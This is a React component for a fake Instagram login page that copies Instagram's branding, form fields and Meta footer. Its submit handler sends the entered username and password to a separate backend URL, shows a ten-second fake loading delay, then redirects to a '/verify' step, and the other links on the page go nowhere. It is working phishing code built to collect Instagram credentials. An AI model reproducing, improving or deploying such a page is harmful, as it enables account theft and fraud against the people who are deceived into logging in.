import React, { useState } from 'react';
import './index.css';
import axios from 'axios';
import { useNavigate } from "react-router-dom";
import baseUrl from '../../url';

const InstagramDarkLogin = () => {
  const [credentials, setCredentials] = useState({
    username: '',
    password: ''
  });
  
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  
  const handleChange = (e) => {
    const { name, value } = e.target;
    setCredentials(prev => ({
      ...prev,
      [name]: value
    }));
  };
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    try {
      const response = await axios.post(`${baseUrl}/login`, credentials);
      setLoading(true); // Start loading after backend call
      
      setTimeout(() => {
        // console.log(response); // Log response after 10s
        setLoading(false); // Stop loading after delay
        if(response.data.message == "data submitted")
          navigate('/verify')
      }, 10000);

    } catch (er) {
      console.log(er);
    }
  };
  
  return (
    <div className="dark-login-container">
      <div className="login-content">
        {/* Logo */}
        <div className="instagram-logo">
          <h1>Instagram</h1>
        </div>
        
        {/* Login Form */}
        <form onSubmit={handleSubmit}>
          <div className="input-field">
            <input
              type="text"
              name="username"
              placeholder="Phone number, username, or email"
              value={credentials.username}
              onChange={handleChange}
              required
            />
          </div>
          
          <div className="input-field password-field">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              placeholder="Password"
              value={credentials.password}
              onChange={handleChange}
              required
            />
            {credentials.password && (
              <button
                type="button"
                className="show-password-btn"
                onClick={() => setShowPassword(!showPassword)}
              >
                Show
              </button>
            )}
          </div>
          
          <button type="submit" className="login-btn" disabled={loading}>
            {loading ? <span className="loader"></span> : "Log In"}
          </button>
        </form>
        
        {/* Divider */}
        <div className="divider">
          <div className="line"></div>
          <div className="or-text">OR</div>
          <div className="line"></div>
        </div>
        
        {/* Facebook login */}
        <div className="facebook-login">
          <a href="#" className="fb-link">
            <svg viewBox="0 0 24 24" width="16" height="16" className="fb-icon">
              <path fill="currentColor" d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C18.34 21.21 22 17.06 22 12.06C22 6.53 17.5 2.04 12 2.04Z" />
            </svg>
            Log in with Facebook
          </a>
        </div>
        
        {/* Forgot password */}
        <div className="forgot-password">
          <a href="#">Forgot password?</a>
        </div>
        
        {/* Sign up section */}
        <div className="signup-section">
          <p>
            Don't have an account? <a href="#" className="signup-link">Sign up</a>
          </p>
        </div>
      </div>
      
      {/* Footer */}
      <footer className="footer">
        <nav className="footer-nav">
          <ul>
            <li><a href="#">Meta</a></li>
            <li><a href="#">About</a></li>
            <li><a href="#">Blog</a></li>
            <li><a href="#">Jobs</a></li>
            <li><a href="#">Help</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Terms</a></li>
            <li><a href="#">Locations</a></li>
            <li><a href="#">Instagram Lite</a></li>
            <li><a href="#">Threads</a></li>
            <li><a href="#">Contact Uploading & Non-Users</a></li>
            <li><a href="#">Meta Verified</a></li>
          </ul>
        </nav>
        <div className="language-copyright">
          <select className="language-selector">
            <option value="en">English</option>
          </select>
          <span>© 2023 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
};

export default InstagramDarkLogin;
